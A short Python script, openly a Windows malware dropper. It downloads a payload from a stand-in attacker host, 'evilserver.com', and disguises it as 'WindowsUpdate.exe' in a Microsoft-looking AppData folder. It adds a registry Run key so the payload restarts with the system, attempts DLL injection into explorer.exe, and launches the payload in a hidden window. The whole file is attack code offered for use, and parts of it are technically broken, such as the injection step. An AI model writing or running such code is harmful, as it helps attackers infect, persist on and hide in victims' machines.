import os
import sys
import subprocess
import winreg
import ctypes
from urllib.request import urlretrieve

# Configuration
PAYLOAD_URL = "http://evilserver.com/ChaosEngine.py"  # Remote payload
DROPPER_NAME = "WindowsUpdate.exe"  # Masquerade as legit
INSTALL_PATH = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\WindowsUpdate")

def download_payload():
    if not os.path.exists(INSTALL_PATH):
        os.makedirs(INSTALL_PATH)
    urlretrieve(PAYLOAD_URL, f"{INSTALL_PATH}\\{DROPPER_NAME}")

def set_persistence():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, f"{INSTALL_PATH}\\{DROPPER_NAME}")
    winreg.CloseKey(key)

def inject_into_process():
    # Simple DLL injection into explorer.exe
    pid = subprocess.check_output("tasklist | findstr explorer.exe", shell=True).decode().split()[1]
    dll_path = f"{INSTALL_PATH}\\helper.dll"
    with open(dll_path, "wb") as f:
        f.write(b"[Fake DLL content]")  # Placeholder; real DLL would be crafted separately
    kernel32 = ctypes.windll.kernel32
    process = kernel32.OpenProcess(0x1F0FFF, False, int(pid))  # PROCESS_ALL_ACCESS
    mem = kernel32.VirtualAllocEx(process, 0, len(dll_path), 0x3000, 0x40)  # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    kernel32.WriteProcessMemory(process, mem, dll_path.encode(), len(dll_path), 0)
    kernel32.LoadLibraryA(mem)
    kernel32.CloseHandle(process)

if __name__ == "__main__":
    download_payload()
    set_persistence()
    inject_into_process()
    subprocess.Popen(f"{INSTALL_PATH}\\{DROPPER_NAME}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
